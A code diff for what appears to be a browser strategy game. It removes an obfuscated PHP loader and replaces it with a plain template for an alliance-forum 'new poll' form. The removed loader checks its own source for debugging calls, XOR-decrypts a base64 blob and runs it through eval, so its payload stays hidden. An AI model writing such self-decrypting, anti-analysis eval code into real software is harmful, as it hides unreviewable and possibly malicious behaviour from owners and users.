@@ -1,24 +1,182 @@
 <?php
-$wxwruk="8f0121a722feb06bb0a2483a02ad7a93";
-$zueazgz="0f0009045355510251560000005454575a00545605000055520500060e510004";
-$vcbwhtlo="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";
-$ymqbruicb=file_get_contents(__FILE__);
-$uhppnsdxp=str_replace($vcbwhtlo,"",$ymqbruicb);
-if(strpos($uhppnsdxp,"ec"."ho")!==false||strpos($uhppnsdxp,"pr"."int")!==false||strpos($uhppnsdxp,"var_"."dump")!==false||strpos($uhppnsdxp,"file_put_"."contents")!==false||strpos($uhppnsdxp,"fw"."rite")!==false){die();}
-$gmiwxbn=str_replace(array($wxwruk,$zueazgz),array("SP_f4d48f9c","KP_57175ed3"),$ymqbruicb);
-$cvfzoumtvz=md5($gmiwxbn);
-$jcjfatwsy=hex2bin($zueazgz);
-$sahspckw="";
-$cssisv=strlen($cvfzoumtvz);
-for($afqbxciegn=0;$afqbxciegn<$cssisv;$afqbxciegn++){
-$sahspckw.=chr(ord($jcjfatwsy[$afqbxciegn])^ord($cvfzoumtvz[$afqbxciegn]));
-}
-$ndkmiyhip=base64_decode($vcbwhtlo);
-$dxykclij=strlen($ndkmiyhip);
-$tiwvvt="";
-$uisirrk=strlen($sahspckw);
-for($afqbxciegn=0;$afqbxciegn<$dxykclij;$afqbxciegn++){
-$tiwvvt.=$ndkmiyhip[$afqbxciegn]^$sahspckw[$afqbxciegn%$uisirrk];
-}
-$dnygffvr="gzun"."compress";
-eval('?>' . $dnygffvr($tiwvvt) . '<?php ');
+/**
+ * New Poll Form — screen=ally&mode=forum&action=new_poll&section_id=X
+ */
+$baseUrl = 'game.php?village=' . $village['id'] . '&screen=ally&mode=forum';
+$activeSectionId = $section['id'] ?? 0;
+?>
+
+<!-- ══ Category Tabs ══ -->
+<div style="margin-bottom:0; padding:0;">
+    <?php foreach ($sections as $sec): ?>
+        <a href="<?= $baseUrl ?>&section_id=<?= $sec['id'] ?>"
+            class="menu_item2<?= ($sec['id'] == $activeSectionId) ? ' selected' : '' ?>"
+            style="display:inline-block; margin-right:2px;">
+            <?= htmlspecialchars($sec['name']) ?>
+        </a>
+    <?php endforeach; ?>
+</div>
+
+<!-- ══ New messages bar ══ -->
+<table width="100%" cellpadding="0" cellspacing="0"
+    style="margin-top:5px; margin-bottom:8px; border:1px solid #b0955a; background:#c8a87a;">
+    <tr>
+        <td style="padding:4px 8px; font-weight:bold; font-style:italic; font-size:12px;">
+            <?= __('screens.ally_forum.new_messages') ?>
+        </td>
+        <td align="right" style="padding:4px 8px;">
+            <input type="checkbox" id="exclude_muted_np" checked>
+            <label for="exclude_muted_np"
+                style="font-style:italic; font-size:11px;"><?= __('screens.ally_forum.exclude_muted') ?></label>
+            &nbsp;
+            <a href="<?= $baseUrl ?>" style="border:1px solid #b0955a; background:#e8c87a; padding:2px 5px;
+                      text-decoration:none; color:#000; font-weight:bold;">+</a>
+        </td>
+    </tr>
+</table>
+
+<?php if (!empty($error)): ?>
+    <div style="padding:8px; background:#ffe0e0; border:1px solid #c00; margin-bottom:10px;">
+        <?= htmlspecialchars($error) ?>
+    </div>
+<?php endif; ?>
+
+<h2 style="margin:15px 0 12px 0; font-size:18px;"><?= __('screens.ally_forum.create_new_poll') ?></h2>
+
+<form id="new_poll_form" method="post"
+    action="<?= $baseUrl ?>&action=new_poll&section_id=<?= $activeSectionId ?>&h=<?= $session['hkey'] ?>">
+
+    <table width="100%" cellpadding="3" cellspacing="0">
+        <!-- Title -->
+        <tr>
+            <td width="90" valign="top" style="padding-top:4px;"><b><?= __('screens.ally_forum.title') ?>:</b></td>
+            <td>
+                <input type="text" name="title" size="50" maxlength="255"
+                    value="<?= htmlspecialchars($_POST['title'] ?? '') ?>"
+                    style="border:1px solid #b0955a; padding:2px; width:350px;">
+            </td>
+        </tr>
+
+        <!-- Question -->
+        <tr>
+            <td valign="top" style="padding-top:4px;"><b><?= __('screens.ally_forum.question') ?>:</b></td>
+            <td>
+                <input type="text" name="question" id="question_input" size="50" maxlength="100"
+                    value="<?= htmlspecialchars($_POST['question'] ?? '') ?>"
+                    style="border:1px solid #b0955a; padding:2px; width:350px;"
+                    oninput="document.getElementById('q_counter').textContent=this.value.length">
+                &nbsp;<span id="q_counter">0</span>/100
+            </td>
+        </tr>
+
+        <!-- Answers -->
+        <tr>
+            <td valign="top" style="padding-top:6px;"><b><?= __('screens.ally_forum.answers') ?>:</b></td>
+            <td id="answers_container">
+                <?php
+                $existingOptions = $_POST['options'] ?? ['', '', ''];
+                foreach ($existingOptions as $opt):
+                    ?>
+                    <input type="text" name="options[]" size="35" maxlength="100" value="<?= htmlspecialchars($opt) ?>"
+                        style="border:1px solid #b0955a; padding:2px; margin-bottom:3px; display:block; width:330px;"><br>
+                <?php endforeach; ?>
+            </td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+                <a href="javascript:void(0)" onclick="addAnswerRow()" style="color:#a05000; font-weight:bold;">
+                    <?= __('screens.ally_forum.add_answer') ?>
+                </a>
+            </td>
+        </tr>
+
+        <!-- Settings -->
+        <tr>
+            <td colspan="2" style="padding-top:8px;">
+                <label>
+                    <input type="checkbox" name="has_end_date" id="has_end_date" <?= !empty($_POST['has_end_date']) ? 'checked' : '' ?>>
+                    <?= __('screens.ally_forum.end_after_days') ?>
+                    <input type="text" name="end_days" size="4" maxlength="4"
+                        value="<?= htmlspecialchars($_POST['end_days'] ?? '0') ?>"
+                        style="border:1px solid #b0955a; padding:1px 3px; width:40px;">
+                    <?= __('screens.ally_forum.days') ?>
+                </label>
+            </td>
+        </tr>
+        <tr>
+            <td colspan="2">
+                <label>
+                    <input type="checkbox" name="show_before_vote" value="1" <?= !empty($_POST['show_before_vote']) ? 'checked' : '' ?>>
+                    <?= __('screens.ally_forum.show_before_vote') ?>
+                </label>
+            </td>
+        </tr>
+        <tr>
+            <td colspan="2" style="padding-bottom:8px;">
+                <?= __('screens.ally_forum.max_choices') ?>
+                <input type="text" name="max_choices" size="3" maxlength="2"
+                    value="<?= htmlspecialchars($_POST['max_choices'] ?? '1') ?>"
+                    style="border:1px solid #b0955a; padding:1px 3px; width:35px;">
+                <?= __('screens.ally_forum.choices') ?>
+            </td>
+        </tr>
+
+        <!-- BBCode Toolbar (shared component) -->
+        <tr>
+            <td colspan="2">
+                <?php include __DIR__ . '/../components/bbcode_toolbar.php'; ?>
+            </td>
+        </tr>
+
+        <!-- Text body -->
+        <tr>
+            <td valign="top" style="padding-top:4px;"><b><?= __('screens.ally_forum.text') ?>:</b></td>
+            <td>
+                <textarea name="content" id="poll_content_area" rows="10"
+                    style="width:100%; min-width:400px; border:1px solid #b0955a; padding:4px;"><?= htmlspecialchars($_POST['content'] ?? '') ?></textarea>
+            </td>
+        </tr>
+    </table>
+
+    <div style="margin-top:10px;">
+        <input type="submit" name="preview" value="<?= __('screens.ally_forum.preview') ?>" class="btn">
+        &nbsp;
+        <input type="submit" name="submit" value="<?= __('screens.ally_forum.send') ?>" class="btn">
+    </div>
+</form>
+
+<?php if (isset($can_moderate) && $can_moderate): ?>
+    <div style="text-align:center; margin-top:20px;">
+        <a href="<?= $baseUrl ?>&action=manage_categories"
+            style="font-weight:bold;"><?= __('screens.ally_forum.admin_forum') ?></a>
+    </div>
+<?php endif; ?>
+
+<script>
+    function addAnswerRow() {
+        var container = document.getElementById('answers_container');
+        var input = document.createElement('input');
+        input.type = 'text';
+        input.name = 'options[]';
+        input.size = 35;
+        input.maxLength = 100;
+        input.style.cssText = 'border:1px solid #b0955a; padding:2px; margin-bottom:3px; display:block; width:330px;';
+        container.appendChild(input);
+        container.appendChild(document.createElement('br'));
+        input.focus();
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+        var q = document.getElementById('question_input');
+        if (q) document.getElementById('q_counter').textContent = q.value.length;
+    });
+
+    $(document).ready(function () {
+        BBCodes.init({
+            target: '#poll_content_area',
+            ajax_unit_url: 'ajax/unit_bb.php',
+            ajax_building_url: 'ajax/build_bb.php'
+        });
+    });
+</script>
